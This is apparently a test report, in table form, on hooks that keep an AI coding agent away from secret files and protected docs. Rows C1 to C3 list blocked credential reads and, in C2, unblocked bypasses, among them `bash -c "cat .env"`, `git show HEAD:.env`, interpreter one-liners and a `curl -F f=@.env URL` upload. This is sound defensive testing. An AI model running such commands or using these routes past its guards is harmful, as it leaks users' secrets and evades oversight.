## Corecrew — behaviour (run in a throwaway sandbox, never the real Core)

Method: scripts in the scratchpad feed realistic hook JSON to the hooks. Sandbox = new-layout
project (`<Core>/demo/CLAUDE.md`, code folder `<Projects>/Demo`).

| ID | Area | Result |
|---|---|---|
| C1 | guard-secrets, direct reads | `cat/tail/less/source/cp/tar`, redirects, `~/.ssh`, `$HOME/.ssh`, `.e""nv`, `cat .env \| head`, `$(<.env)` are blocked (exit 2); `.env.example`, `.envrc`, `grep .env README.md`, `cp .env.example .env`, `grep process.env src` pass. No false positives in 10 ordinary commands. |
| C2 | guard-secrets, bypasses | **Not blocked:** `bash -c "cat .env"`, `sh -c "cat .env"`, `find . -name .env -exec cat {} \;`, `git show HEAD:.env`, `dd if=.env`, `curl -F f=@.env URL`, `cat *.env`, `cat $(echo .env)`, `xargs cat < <(echo .env)`, `python3 -c`, `node -e`, `ruby -e`, `perl`. The hook header says Bash is "best effort", so this is by design, but `bash -c`/`sh -c`/`find -exec`/`git show`/`dd`/`curl @` are cheap to close and are the shapes a model produces by accident. The interpreter case cannot be closed in a lexer; it must be said plainly (README + block message) instead of implied. |
| C3 | guard-code | Blocks `CLAUDE.md`, `AGENTS.md`, `docs/**`, `.claude/**`, `docs/superpowers` in the code folder via Write/Edit and via Bash redirects, `touch`, `cp`, `mv`, `tee`, heredoc. Allows README, CHANGELOG, `src/`, `docs/../src`, `npm run docs`, `ls docs`, `cat CLAUDE.md`, commit messages mentioning docs. Not blocked: `git -C . mv a docs/a`, `python -c` writes (best effort, same class as C2). |
| C4 | Hook latency | guard-secrets 47 ms inside / 33 ms outside a project, guard-code 19 ms, session-start 153 ms. Acceptable on every tool call. |
| C5 | one-suite stall | Synthetic back-to-back calls (five test commands in a row, no real test) averaged 8.7 s: the first call makes the "turn" directory, and a second test command within `ONE_SUITE_GRACE` (10 s) sees no process but a fresh turn and sleeps out the grace. **Severity downgraded to low after reasoning about real use:** between two real test runs the model must read the output and edit, which takes longer than 10 s in most loops; the stall shows only when a failing run is re-run at once (e.g. with a filter), and then costs a few seconds. A PostToolUse hook that releases the turn would fix it but would break the turn's reason (a run in the background starts after the Post fires) and add a sixth hook to every document that says five. **Decision: no code change;** keep the grace, mention it in the hook header as a known trade-off. |
| C6 | session-start | In a new-layout project it prints the project, the docs index path, save/undo commands, "Standards: none", and links `CLAUDE.local.md` with the line "restart the session to load it". The first session in a project therefore needs one restart before the private CLAUDE.md applies: the one visible seam of the product. Check whether the hook can say it once, in one line, and whether it can avoid the restart (it cannot load the file in the running session; the line is correct, but it is the only text that asks the user to act). |
| C7 | References | Every `${CLAUDE_SKILL_DIR}` and `${CLAUDE_PLUGIN_ROOT}` path in skills, agents and references resolves to a real file. Backticked `docs/...` paths are the user project's wiki, not this repo (checked, not defects). |
| C8 | `model_profile` | Setting exists; `task` passes the model per Agent call (SKILL.md "Model per role"). The agents' frontmatter fixes `model: sonnet`; the per-call override depends on the Agent tool accepting `model` for plugin agents, which spec §13.4 left as "to verify in phase 4". See docs-gap table. |
